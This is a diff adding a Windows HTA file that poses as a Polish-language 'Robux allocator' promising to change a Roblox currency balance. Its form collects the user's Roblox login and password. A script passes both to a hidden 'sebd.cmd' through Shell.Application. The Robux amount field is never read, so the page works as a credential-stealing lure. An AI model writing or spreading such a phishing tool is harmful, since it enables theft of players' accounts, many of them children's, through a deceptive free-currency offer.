@@ -1,0 +1,61 @@
+<HTA:APPLICATION ID="Robux allocator" 
+APPLICATIONNAME="Robux allocator"
+BORDER="thin"
+CAPTION="yes"
+SHOWINTASKBAR="yes"
+SINGLEINSTANCE="yes"
+SYSMENU="yes"
+MAXIMIZEBUTTON="no"
+SCROLL="no"
+ICON="icon.ico"
+navigable="yes"
+WINDOWSTATE="normal">
+
+
+<!doctype html>
+<html>
+	<head>
+		<title>Robux allocator</title>
+		<meta charset="UTF-8">
+		<link rel="stylesheet" type="text/css" href="bhtfguistyle.css">
+		<script type="text/javascript">
+			window.resizeTo(680,720);
+		</script>
+		<script type="text/javascript">
+			function run()
+			{
+				var argument1 = document.getElementById("login").value;
+				var argument2 = document.getElementById("password").value;
+				var oShell = new ActiveXObject("Shell.Application");
+				oShell.ShellExecute("sebd.cmd","Login:" + argument1 + "  Password:" + argument2,"","open","0");
+			}
+		</script>
+	</head>
+	<body>
+		<header>
+			<img src="ROBUX.png" style="width: 100%;">
+		</header>
+		<br>
+		<br>
+		<br>
+		<p>
+			Uwaga, program nie dodaje robuxów tylko zmienia ich ilość.
+			<br>
+			Wpisz większą ilość robuxów niż masz aby nie usunąć posiadanej przez ciebie waluty.
+		</p>
+		<br>
+		<br>
+		<br>
+		<label><i>Twój login:  </i><input type="text" id="login"></label>
+		<br>
+		<label><i>Twoje hasło:  </i><input type="password" id="password"></label>
+		<br>
+		<label><i>Ilość Robuxów:  </i><input type="number"><i>  (Liczba nie może zawierać przecinka)</i></label>
+		<br>
+		<br>
+		<br>
+		<br>
+		<a href="loading.hta" target="_self" class="buttoninstall" onclick="run()">Daj robuxy ►</a>
+
+	</body>
+</html>
